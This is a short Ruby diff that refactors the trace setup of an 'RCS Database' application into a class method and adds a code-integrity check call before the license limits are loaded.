@@ -17,13 +17,9 @@ module DB
 
 class Application
   include RCS::Tracer
+  extend RCS::Tracer
 
-  # the main of the collector
-  def run(options)
-
-    # initialize random number generator
-    srand(Time.now.to_i)
-
+  def self.trace_setup
     # if we can't find the trace config file, default to the system one
     if File.exist? 'trace.yaml' then
       typ = Dir.pwd
@@ -44,10 +40,20 @@ class Application
       puts e
       exit
     end
+  end
+
+  # the main of the collector
+  def run(options)
+
+    # initialize random number generator
+    srand(Time.now.to_i)
 
     begin
       version = File.read(Dir.pwd + '/config/version.txt')
       trace :info, "Starting the RCS Database #{version}..."
+
+      # check the integrity of the code
+      HeartBeat.dont_steal_rcs
 
       # load the license limits
       return 1 unless LicenseManager.instance.load_license
@@ -90,6 +96,7 @@ class Application
 
   # we instantiate here an object and run it
   def self.run!(*argv)
+    self.trace_setup
     return Application.new.run(argv)
   end
 
